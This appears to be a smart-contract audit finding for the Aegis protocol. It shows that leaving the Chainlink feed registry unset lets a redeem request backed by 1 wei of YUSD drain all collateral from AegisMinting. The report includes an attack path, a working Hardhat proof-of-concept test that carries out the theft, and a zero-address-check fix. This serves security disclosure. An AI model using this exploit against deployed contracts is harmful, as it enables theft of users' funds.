# attacker can steal all the collateral if ChainLink `_feedRegistry` is not set or set to `address(0)`

### Summary

If `_feedRegistry` is set to `address(0)`or not set at all (which is currently allowed during deployment as well) attacker can steal all the collateral from the contract with just 1 wei YUSD.

Why this admin input related finding is valid: the explicit [if (address(_feedRegistry) == address(0))](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L806) check signals that the `_feedRegistry` can be indeed the `address(0)` or potentially set to this value by the admins, which is exploitable since it returns `0,0` and it contradicts the [zero value check ](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L811)done on the chainlink price-feed `answer`.  It is [explicitly](https://github.com/sherlock-audit/2025-04-aegis-op-grant-gabkov?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths) mentioned in the README as well that the admins should be trusted to set **any** value. This behaviour should not be allowed in any cases, because of the exploit detailed bellow.

### Root Cause

At [AegisMinting.sol#L751](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L751) in `_calculateRedeemMinCollateralAmount` the `collateralAmount` always going to be the user supplied `order.collateralAmount` if `_feedRegistry` is not set. 

The reason being the default [return(0, 0)](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L807) which will lead to [_getAssetUSDPriceChainlink](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L757) to return `(0, 0)` and skipping the calculation for the ChainLink based collateralAmount. 

Since the `aegisOracle` based calculation depending on the [_getAssetUSDPriceChainlink](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L827) function, it will result in `_getAssetYUSDPriceOracle` to return `(0, 8)`. The reason being `assetUSDPrice` will be 0 ultimately allowing the attacker to pass any `collateralAmount`, because the oracle based calculations will be skipped by the `_calculateRedeemMinCollateralAmount` function even if the `aegisOracle` is set.

### Internal Pre-conditions

1. `_feedRegistry` is set to `address(0)` or not set at all

Note: if `whitelistEnabled` is set to `true` only whitelisted users can execute the attack, but considering how is easy is to bypass KYC this is not a huge limiting factor. If `whitelistEnabled` is set to `false` anyone can exploit it. 

### External Pre-conditions

1. `approveRedeemRequest` is automated and requests are not monitored

### Attack Path

1. attacker buys very small amount of YUSD (even 1 wei is enough) -> it will pass the [_checkMintRedeemLimit](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L285) check
2. attacker approves YUSD for AegisMinting
3. Attacker creates a `RedeemRequest` where the `order.collateralAmount` can be set to any amount to drain the collateral asset, also setting `order.yusdAmount` to the small amount of YUSD
4. RedeemRequest being created and eventually approved -> collateral funds transferred to the attacker


### Impact

The attacker can steal all the collateral asset from the protocol.

### PoC

Paste the following test bellow [6_aegis_minting_redeem.spec.ts#L706](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/test/6_aegis_minting_redeem.spec.ts#L706) into the `success` cases. The test demonstrates the attack.

```typescript
it('(whitelisted) users can steal all the collateral if feedRegistry is not set', async () => {
        const [owner, attacker] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetAddress, assetContract, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner)
        // attacker needs to be whitelisted because whitelistEnabled is set to true
        await aegisConfig['whitelistAddress(address,bool)'](attacker, true)

        // only aegis oracle is set
        const aegisOracle = await ethers.deployContract('AegisOracle', [[owner], owner])
        await aegisOracle.setOperator(owner, true)
        await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner)
        await aegisMintingContract.setAegisOracleAddress(aegisOracle)

        await aegisOracle.updateYUSDPrice('100000000')

        const collateralAmount = ethers.parseEther('100')
        // Mint asset funds simulating deposited collateral
        await assetContract.mint(aegisMintingContract, collateralAmount)

        await yusdContract.setMinter(owner)
        // mint 1 wei for the attacker (in real word scenario this would be a small swap)
        await yusdContract.mint(attacker,  1n)
        await yusdContract.setMinter(aegisMintingAddress)
        // Approve YUSD for AegisMinting contract from attacker
        await yusdContract.connect(attacker).approve(aegisMintingAddress, 1n)

        const requestId = 'test'
        const yusdAmount = 1n
        const redeemOrder = {
          orderType: OrderType.REDEEM,
          userWallet: attacker.address,
          collateralAsset: assetAddress,
          collateralAmount: collateralAmount,
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: collateralAmount,
          expiry: (await time.latest()) + 10000,
          nonce: Date.now(),
          additionalData: encodeString(requestId),
        }
        const signature = await signOrder(redeemOrder, aegisMintingAddress)

        // attacker can create a valid reedem request with just 1 wei YUSD and steal the collateral assets
        await expect(aegisMintingContract.connect(attacker).requestRedeem(redeemOrder, signature)).to.be.not.reverted

        const contractYUSDBalanceBefore = await yusdContract.balanceOf(aegisMintingContract)
        const userAssetBalanceBefore = await assetContract.balanceOf(attacker)

        // attacker steals the collateralAmount from the contract with just 1 wei of YUSD if the request is approved
        await expect(aegisMintingContract.approveRedeemRequest(requestId, collateralAmount)).to.
          emit(aegisMintingContract, 'ApproveRedeemRequest').
          withArgs(requestId, owner.address, attacker.address, assetAddress, collateralAmount, yusdAmount, 0).
          emit(yusdContract, 'Transfer').
          withArgs(aegisMintingContract, ethers.ZeroAddress, yusdAmount).
          emit(assetContract, 'Transfer').
          withArgs(aegisMintingContract, attacker, collateralAmount)

        const redeemRequest = await aegisMintingContract.getRedeemRequest(requestId)

        await expect(yusdContract.balanceOf(aegisMintingContract)).to.be.eventually.equal(contractYUSDBalanceBefore - yusdAmount)
        // successful exploit
        await expect(assetContract.balanceOf(attacker)).to.be.eventually.equal(userAssetBalanceBefore + collateralAmount)
        expect(redeemRequest.status).to.be.equal(RedeemRequestStatus.APPROVED)
      })
```

then run

```sh
npx hardhat test test/6_aegis_minting_redeem.spec.ts --grep '\(whitelisted\) users can steal all the collateral if feedRegistry is not set'
```

### Mitigation

In my opinion the `_feedRegistry` should not be allowed to be set to the zero address at all, because of the potential exploit it can cause.

The easiest mitigation would be to explicitly check in [_setFeedRegistryAddress](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L691) if `_registry` is `address(0)` enforcing it from beginning to be set properly and also avoiding future user errors setting it to the zero address.

```solidity
function _setFeedRegistryAddress(FeedRegistryInterface _registry) internal {
    if(address(_registry) == address(0)) revert ZeroAddress();
    _feedRegistry = _registry;
    emit SetFeedRegistryAddress(address(_registry));
}
```

This would allow to delete the [check](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L806) which resulted the exploit to be removed completely.

Inherently I would consider the same changes for `aegisOracle` as well for consistency and better security, but the missing ChainLink oracle is the main root cause of this exploit.
